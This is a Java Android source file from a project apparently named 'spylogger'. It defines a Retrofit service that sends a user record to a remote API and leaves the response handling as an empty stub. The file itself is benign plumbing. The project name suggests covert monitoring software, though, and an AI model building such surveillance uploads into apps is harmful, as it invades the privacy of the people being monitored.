package com.gravatasufoca.spylogger.services;

import android.os.Handler;

import com.gravatasufoca.spylogger.vos.UsuarioVO;

import retrofit2.Call;
import retrofit2.Response;

/**
 * Created by bruno on 02/12/16.
 */

public class SendUsuarioService extends SendDataService<UsuarioVO> {

    public SendUsuarioService(Handler handler) {
        super(handler);
    }

    public void inserirUsuario(UsuarioVO usuarioVO){
        Call<UsuarioVO> call=sendApi.inserirUsuario(usuarioVO);
        call.enqueue(this);
    }

    @Override
    public void onResponse(Call<UsuarioVO> call, Response<UsuarioVO> response) {
        UsuarioVO usuarioVO=response.body();
        if(handler!=null){
            //faz alguma coisa!!!
        }
    }

    @Override
    public void onFailure(Call<UsuarioVO> call, Throwable t) {
        call.toString();
    }
}
